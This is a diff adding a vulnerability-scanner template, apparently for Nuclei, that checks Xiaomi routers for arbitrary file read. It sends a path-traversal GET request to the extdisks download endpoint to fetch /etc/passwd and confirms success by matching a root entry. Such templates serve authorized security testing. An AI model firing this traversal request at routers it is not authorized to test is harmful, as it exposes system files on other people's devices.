@@ -1,0 +1,23 @@
+id: poc-yaml-xiaomi-extdisks-any-fileread
+info:
+  name: Xiaomi Router extdisks Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api-third-party/download/extdisks../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
